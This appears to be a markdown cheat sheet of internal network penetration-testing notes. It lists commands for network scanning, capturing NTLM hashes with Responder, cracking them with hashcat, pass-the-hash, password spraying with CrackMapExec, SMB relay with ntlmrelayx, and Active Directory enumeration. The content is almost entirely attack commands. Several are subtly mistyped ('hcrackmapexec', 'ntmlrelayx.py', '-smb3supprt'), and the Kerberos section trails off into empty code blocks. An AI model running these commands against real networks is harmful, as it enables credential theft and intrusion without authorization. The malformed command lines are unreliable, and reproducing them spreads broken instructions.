# Internal Network Pentesting
Notes for Internal Network Pentesting 


###  Nmap

```bash
nmap -sn 192.168.1.1/24
```
```bash
nmap -sV -sC -A -p- IP-Address
```

###  Responder

```bash
responder -I <interface> -rdw
```
#### After capturing NTLM Hash (copy the captured hash into .txt format) copy full hash from username to end of the hash.

```bash
hashcat -m 5600 hash.txt /path/to/wordlist.txt
```
#### Pass The Hash
```bash
hcrackmapexec smb IP-address/CIRD -U FirstName.LastName -H Hash-File --local
```

### SMB Relay attack
#### Make sure you turn off the SMB and HTTP from responder configuration

```bash
nano /etc/responder/Responder.conf
```
- For this attack you need to have ntml hash, use can use responder for capture hash.
- Scanning for Signing disabled machines, make sure you save the host example : TargetHost.txt
```bash
nmap --script=smb2-security-mode.nse -p 445 192.168.1.1/24,134 -Pn --open | tee -a target.txt
```

#### Use ntlmrelayx
```bash
python3 ntmlrelayx.py -tf /path/to/target_host_nmap_above -smb3supprt
```

### CrackMapExec 

```bash
crackmapexec smb "10.0.9.0/24" -u "FirstName.LastName" -p /path/to/password.txt
```

### Active Directory
#### Nmap. 
```bash
nmap -Pn -sV -sC -oN top IP-Address
```
- Look for ports such as :
```bash
53 → DNS
139,135,445 → RPC or SMB
3389 → RDP or domain controller
88 → kerberos
389 → Ldap
636 → ldaps
445 → SMB
```
#### enum4linux
```bash
enum4linux -A IP-Address
```
 #### Abusing Kerberos.
 - Kerbrute can be used to perform discovery of user,passwords and even password spray. It's just a bruteforce tool so you need have a list of username and password. Recommendation : Try building custom username (of an organization) and password.
```bash

```
```bash

``````bash

```
```bash

``````bash

```
```bash


```

